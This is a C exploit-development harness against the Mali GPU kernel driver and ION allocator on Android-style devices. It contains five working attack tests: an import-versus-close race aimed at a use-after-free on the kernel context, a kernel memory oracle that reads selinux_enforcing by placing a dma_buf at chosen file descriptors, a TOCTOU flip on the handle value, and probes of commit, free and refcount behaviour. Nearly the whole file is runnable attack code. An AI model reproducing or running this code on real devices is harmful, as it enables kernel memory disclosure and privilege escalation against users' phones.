/*
 * mali_exploit11.c — Exploitation via import races and kernel oracle
 *
 * CONFIRMED PRIMITIVES:
 * 1. Vendor import dereferences phandle as raw pointer (no copy_from_user)
 * 2. Can read from kernel addresses (phandle = kernel_addr → reads *(int*)addr)
 * 3. Import succeeds when *phandle = valid dma_buf fd
 * 4. Double import creates separate regions
 *
 * ATTACK PLAN:
 * Test 1: Race import vs close(mali_fd) — UAF on kctx
 * Test 2: Kernel memory oracle — determine byte values at kernel addresses
 * Test 3: Import + MEM_COMMIT on imported region + vendor free
 * Test 4: Race import vs munmap of phandle page (TOCTOU)
 * Test 5: Mass import reference leak check
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16]; memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static int ion_alloc_dmabuf(void) {
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) return -1;
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc_s = {4096, 4096, 1, 0, 0};
    if (ioctl(ion_fd, 0xc0144900, &alloc_s) < 0) { close(ion_fd); return -1; }
    struct { int32_t handle, fd; } share_s = {alloc_s.handle, 0};
    if (ioctl(ion_fd, 0xc0084904, &share_s) < 0) { close(ion_fd); return -1; }
    /* Keep ion_fd open (leaked) to keep handle alive */
    return share_s.fd;
}

/* ============================================================= */
/* TEST 1: Race import vs close(mali_fd)                          */
/* If close happens during import processing → kctx UAF           */
/* ============================================================= */
static volatile int g_mali_fd = -1;
static volatile int g_running = 1;
static volatile int g_dma_fd = -1;
static volatile int g_crashes = 0;
static volatile int g_success = 0;

static void *import_thread(void *arg) {
    while (g_running) {
        int fd = g_mali_fd;
        if (fd < 0) { usleep(10); continue; }

        uint8_t buf[48]; memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&g_dma_fd;
        *(uint32_t*)(buf + 16) = 2;
        *(uint64_t*)(buf + 24) = 0xF;

        int r = ioctl(fd, make_cmd_vendor(48), buf);
        uint32_t result = ((struct uk_header*)buf)->id;
        if (r == 0 && result == 0) {
            __sync_fetch_and_add(&g_success, 1);
            /* Try to free it to avoid leaking */
            uint64_t va = *(uint64_t*)(buf + 32);
            if (va) {
                uint8_t fb[16]; memset(fb, 0, 16);
                ((struct uk_header*)fb)->id = 516;
                *(uint64_t*)(fb + 8) = va;
                ioctl(fd, make_cmd_vendor(16), fb);
            }
        }
        usleep(1);
    }
    return NULL;
}

static void *close_thread(void *arg) {
    while (g_running) {
        int fd = g_mali_fd;
        if (fd < 0) { usleep(100); continue; }

        /* Close the fd */
        g_mali_fd = -1;
        close(fd);

        /* Brief delay then reopen */
        usleep(50);
        int new_fd = mali_open_ctx();
        g_mali_fd = new_fd;
        usleep(100);
    }
    return NULL;
}

static void test1(void) {
    fprintf(stderr, "\n=== TEST 1: Race import vs close ===\n");

    g_dma_fd = ion_alloc_dmabuf();
    if (g_dma_fd < 0) { fprintf(stderr, "  No dma_buf\n"); return; }
    fprintf(stderr, "  dma_fd=%d\n", g_dma_fd);

    g_mali_fd = mali_open_ctx();
    g_running = 1;
    g_crashes = 0;
    g_success = 0;

    pthread_t t_import, t_close;
    pthread_create(&t_import, NULL, import_thread, NULL);
    pthread_create(&t_close, NULL, close_thread, NULL);

    /* Run for 3 seconds */
    sleep(3);
    g_running = 0;

    pthread_join(t_import, NULL);
    pthread_join(t_close, NULL);

    fprintf(stderr, "  Survived 3 seconds!\n");
    fprintf(stderr, "  Successful imports during race: %d\n", g_success);

    if (g_mali_fd >= 0) close(g_mali_fd);
    close(g_dma_fd);
}

/* ============================================================= */
/* TEST 2: Kernel memory oracle                                    */
/* Create dma_bufs at specific fd numbers, then scan kernel mem    */
/* ============================================================= */
static void test2(void) {
    fprintf(stderr, "\n=== TEST 2: Kernel memory oracle ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    /* Figure out our fd landscape */
    int dma_fd = ion_alloc_dmabuf();
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);
    if (dma_fd < 0) { close(mali_fd); return; }

    /* Test: scan for dma_fd value in kernel .data/.bss */
    /* selinux_enforcing=0xC0B7AD54 should be 1 */
    /* Look for known small values in kernel memory */

    /* First: verify the oracle works with a known value */
    /* Map memory and store dma_fd at that address */
    void *mapped = mmap((void *)0x40000000, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    *(int *)((char *)mapped + 0x1000) = dma_fd;

    /* Sanity: import with mapped user address (should work) */
    uint8_t buf[48]; memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = 0x40001000;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Oracle sanity (user addr): result=%u (0=success)\n",
            ((struct uk_header*)buf)->id);

    /* Free the imported region */
    if (((struct uk_header*)buf)->id == 0) {
        uint64_t va = *(uint64_t*)(buf + 32);
        uint8_t fb[16]; memset(fb, 0, 16);
        ((struct uk_header*)fb)->id = 516;
        *(uint64_t*)(fb + 8) = va;
        ioctl(mali_fd, make_cmd_vendor(16), fb);
    }

    /* Now test: kernel address for selinux_enforcing */
    /* Value should be 1. Our dma_fd is > 3. So result should be 3 (fail) */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint32_t*)(buf + 8) = 0xC0B7AD54;
    *(uint32_t*)(buf + 12) = 0;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  selinux_enforcing (0xC0B7AD54): result=%u\n",
            ((struct uk_header*)buf)->id);

    /* Try to make the oracle work: create dma_buf at fd=1 */
    /* We can dup2 the dma_buf to fd=1 */
    int saved_stdout = dup(1);
    dup2(dma_fd, 1);
    fprintf(stderr, "  dup2'd dma_buf to fd=1\n");

    /* Now try selinux_enforcing again — value=1, and fd=1 is now a dma_buf */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint32_t*)(buf + 8) = 0xC0B7AD54;
    *(uint32_t*)(buf + 12) = 0;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    uint32_t r2 = ((struct uk_header*)buf)->id;
    fprintf(stderr, "  selinux_enforcing with fd=1=dma_buf: result=%u\n", r2);
    if (r2 == 0) {
        fprintf(stderr, "  *** KERNEL ORACLE WORKS! ***\n");
        fprintf(stderr, "  Confirmed: selinux_enforcing = 1\n");
        /* Free the import */
        uint64_t va = *(uint64_t*)(buf + 32);
        uint8_t fb[16]; memset(fb, 0, 16);
        ((struct uk_header*)fb)->id = 516;
        *(uint64_t*)(fb + 8) = va;
        ioctl(mali_fd, make_cmd_vendor(16), fb);
    }

    /* Restore stdout */
    dup2(saved_stdout, 1);
    close(saved_stdout);

    /* Advanced oracle: scan a kernel region */
    /* dup2 dma_buf to multiple fd numbers */
    fprintf(stderr, "\n  Scanning kernel memory (fd sweep):\n");
    for (int target_fd = 0; target_fd < 16; target_fd++) {
        int saved = dup(target_fd);
        if (saved < 0) continue;
        if (dup2(dma_fd, target_fd) < 0) { close(saved); continue; }

        /* Try selinux_enforcing */
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        *(uint32_t*)(buf + 8) = 0xC0B7AD54;
        *(uint32_t*)(buf + 12) = 0;
        *(uint32_t*)(buf + 16) = 2;
        *(uint64_t*)(buf + 24) = 0xF;
        ioctl(mali_fd, make_cmd_vendor(48), buf);
        uint32_t res = ((struct uk_header*)buf)->id;
        if (res == 0) {
            fprintf(stderr, "    fd=%d: MATCH → selinux_enforcing=%d\n",
                    target_fd, target_fd);
            /* Free */
            uint64_t va = *(uint64_t*)(buf + 32);
            uint8_t fb[16]; memset(fb, 0, 16);
            ((struct uk_header*)fb)->id = 516;
            *(uint64_t*)(fb + 8) = va;
            ioctl(mali_fd, make_cmd_vendor(16), fb);
        }

        dup2(saved, target_fd);
        close(saved);
    }

    munmap(mapped, 0x10000);
    close(dma_fd);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 3: Import + MEM_COMMIT + vendor_free                      */
/* Does MEM_COMMIT on imported region change behavior?            */
/* ============================================================= */
static void test3(void) {
    fprintf(stderr, "\n=== TEST 3: Import + commit + free ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;
    int dma_fd = ion_alloc_dmabuf();
    if (dma_fd < 0) { close(mali_fd); return; }

    uint64_t gpu_va;

    /* Import */
    uint8_t buf[48]; memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    gpu_va = *(uint64_t*)(buf + 32);
    fprintf(stderr, "  Import: result=%u gpu_va=0x%llx\n",
            ((struct uk_header*)buf)->id, (unsigned long long)gpu_va);

    if (!gpu_va) goto done;

    /* MEM_COMMIT (514) on the imported region */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 514;
    *(uint64_t*)(buf + 8) = gpu_va;
    *(uint64_t*)(buf + 16) = 1;  /* pages */
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Vendor commit: result=%u\n", ((struct uk_header*)buf)->id);

    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 514;
    *(uint64_t*)(buf + 8) = gpu_va;
    *(uint64_t*)(buf + 16) = 1;
    ioctl(mali_fd, make_cmd_std(48), buf);
    fprintf(stderr, "  Std commit: result=%u\n", ((struct uk_header*)buf)->id);

    /* FLAGS_CHANGE (517) — try vendor dispatch */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 517;
    *(uint64_t*)(buf + 8) = gpu_va;
    *(uint32_t*)(buf + 16) = 0xF; /* mask */
    *(uint32_t*)(buf + 20) = 0xF; /* flags */
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Vendor flags_change: result=%u\n",
            ((struct uk_header*)buf)->id);

    /* MEM_QUERY (515) */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 515;
    *(uint64_t*)(buf + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Vendor query: result=%u\n", ((struct uk_header*)buf)->id);
    for (int i = 0; i < 48; i += 4) {
        uint32_t v = *(uint32_t*)(buf + i);
        if (v != 0)
            fprintf(stderr, "    [%d] 0x%08x\n", i, v);
    }

    /* Free */
    uint8_t fb[16]; memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_vendor(16), fb);
    fprintf(stderr, "  Free: result=%u\n", ((struct uk_header*)fb)->id);

done:
    close(dma_fd);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 4: TOCTOU — race import vs munmap of phandle page         */
/* Thread A: import with phandle pointing to mapped page          */
/* Thread B: rapidly munmap/mmap that page with different fd      */
/* ============================================================= */
static volatile int g_toctou_running = 1;
static volatile uint32_t *g_toctou_ptr = NULL;
static int g_toctou_fd_good = -1;
static int g_toctou_fd_bad = -1;

static void *toctou_flip_thread(void *arg) {
    /* Rapidly change the value at *phandle between good and bad fd */
    while (g_toctou_running) {
        if (g_toctou_ptr) {
            *(volatile uint32_t *)g_toctou_ptr = g_toctou_fd_bad;
            usleep(0);
            *(volatile uint32_t *)g_toctou_ptr = g_toctou_fd_good;
            usleep(0);
        }
    }
    return NULL;
}

static void test4(void) {
    fprintf(stderr, "\n=== TEST 4: TOCTOU race on phandle data ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;
    g_toctou_fd_good = ion_alloc_dmabuf();
    if (g_toctou_fd_good < 0) { close(mali_fd); return; }

    /* "bad" fd is a non-dma_buf fd */
    g_toctou_fd_bad = open("/dev/null", O_RDONLY);
    fprintf(stderr, "  good_fd=%d bad_fd=%d\n", g_toctou_fd_good, g_toctou_fd_bad);

    void *mapped = mmap((void *)0x40000000, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    g_toctou_ptr = (volatile uint32_t *)((char *)mapped + 0x1000);
    *g_toctou_ptr = g_toctou_fd_good;

    g_toctou_running = 1;
    pthread_t flipper;
    pthread_create(&flipper, NULL, toctou_flip_thread, NULL);

    int successes = 0, failures = 0, errors = 0;
    for (int i = 0; i < 500; i++) {
        uint8_t buf[48]; memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        *(uint64_t*)(buf + 8) = 0x40001000;
        *(uint32_t*)(buf + 16) = 2;
        *(uint64_t*)(buf + 24) = 0xF;

        ioctl(mali_fd, make_cmd_vendor(48), buf);
        uint32_t result = ((struct uk_header*)buf)->id;

        if (result == 0) {
            successes++;
            /* Free to avoid leak */
            uint64_t va = *(uint64_t*)(buf + 32);
            uint8_t fb[16]; memset(fb, 0, 16);
            ((struct uk_header*)fb)->id = 516;
            *(uint64_t*)(fb + 8) = va;
            ioctl(mali_fd, make_cmd_vendor(16), fb);
        } else if (result == 3) {
            failures++;
        } else {
            errors++;
        }
        usleep(10);
    }

    g_toctou_running = 0;
    pthread_join(flipper, NULL);

    fprintf(stderr, "  500 trials: %d success, %d fail, %d errors\n",
            successes, failures, errors);
    fprintf(stderr, "  If some succeed while flip was to bad_fd → partial import!\n");

    munmap(mapped, 0x10000);
    close(g_toctou_fd_bad);
    close(g_toctou_fd_good);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 5: Mass import/free — check for ref count leak            */
/* ============================================================= */
static void test5(void) {
    fprintf(stderr, "\n=== TEST 5: Mass import/free ref leak ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;
    int dma_fd = ion_alloc_dmabuf();
    if (dma_fd < 0) { close(mali_fd); return; }

    /* mmap the dma_buf to pin pages */
    void *dm = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0);
    if (dm == MAP_FAILED) { fprintf(stderr, "  mmap failed\n"); goto done; }
    memset(dm, 0x41, 4096);

    /* Do 200 import → vendor_free cycles */
    int ok = 0, fail = 0;
    for (int i = 0; i < 200; i++) {
        uint8_t buf[48]; memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
        *(uint32_t*)(buf + 16) = 2;
        *(uint64_t*)(buf + 24) = 0xF;
        ioctl(mali_fd, make_cmd_vendor(48), buf);

        if (((struct uk_header*)buf)->id != 0) { fail++; continue; }
        ok++;

        uint64_t va = *(uint64_t*)(buf + 32);
        uint8_t fb[16]; memset(fb, 0, 16);
        ((struct uk_header*)fb)->id = 516;
        *(uint64_t*)(fb + 8) = va;
        ioctl(mali_fd, make_cmd_vendor(16), fb);
    }
    fprintf(stderr, "  200 cycles: %d ok, %d fail\n", ok, fail);

    /* Read from mmap — should still work */
    uint8_t val = *(volatile uint8_t *)dm;
    fprintf(stderr, "  mmap read: 0x%02x\n", val);

    /* Close everything */
    close(dma_fd);
    fprintf(stderr, "  Closed dma_fd\n");

    /* Read again — if ref leak, page is still alive */
    val = *(volatile uint8_t *)dm;
    fprintf(stderr, "  Read after close: 0x%02x (0x41=page still alive)\n", val);

    /* Close Mali too */
    close(mali_fd);
    mali_fd = -1;

    /* Read again */
    val = *(volatile uint8_t *)dm;
    fprintf(stderr, "  Read after mali close: 0x%02x\n", val);

    munmap(dm, 4096);
    fprintf(stderr, "  munmap done\n");
    return;
done:
    close(dma_fd);
    close(mali_fd);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Import Race Exploitation ===\n");
    fprintf(stderr, "PID=%d UID=%d\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    if (test == 0 || test == 1) {
        pid_t p = fork();
        if (!p) { alarm(10); test1(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st))
            fprintf(stderr, "  TEST 1 CRASHED: signal %d\n", WTERMSIG(st));
    }
    if (test == 0 || test == 2) {
        pid_t p = fork();
        if (!p) { alarm(10); test2(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st))
            fprintf(stderr, "  TEST 2 CRASHED: signal %d\n", WTERMSIG(st));
    }
    if (test == 0 || test == 3) {
        pid_t p = fork();
        if (!p) { alarm(10); test3(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st))
            fprintf(stderr, "  TEST 3 CRASHED: signal %d\n", WTERMSIG(st));
    }
    if (test == 0 || test == 4) {
        pid_t p = fork();
        if (!p) { alarm(10); test4(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st))
            fprintf(stderr, "  TEST 4 CRASHED: signal %d\n", WTERMSIG(st));
    }
    if (test == 0 || test == 5) {
        pid_t p = fork();
        if (!p) { alarm(10); test5(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st))
            fprintf(stderr, "  TEST 5 CRASHED: signal %d\n", WTERMSIG(st));
    }

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
